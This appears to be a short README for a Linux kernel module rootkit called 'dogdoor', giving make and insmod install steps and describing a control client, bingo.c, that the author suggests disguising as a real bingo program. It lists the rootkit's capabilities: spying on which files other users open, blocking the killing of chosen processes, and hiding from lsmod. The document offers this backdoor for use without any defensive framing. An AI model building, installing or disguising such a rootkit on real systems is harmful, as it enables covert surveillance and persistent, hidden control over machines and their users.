# LKM
Linux Kernel Module rootkit

This is LKM rootkit implemented on Ubuntu 16.04

# How to set up

1. run `make` in the directory.
2. `$ insmod dogdoor.ko`

Then dogdoor module will act as a backdoor. You could communicate with this module through `bingo.c`.
Right now, bingo.c doens't have feature execpt to exploit thee system, but one might edit it so it looks like a real bingo program.

run `$ ./bingo` to see how it works.

The dogdoor.ko can do three things

1. It can monitor what kind of file other user opens
2. It can stop them from killing specified process
3. It can be unseen from `lsmod`.

Have fun
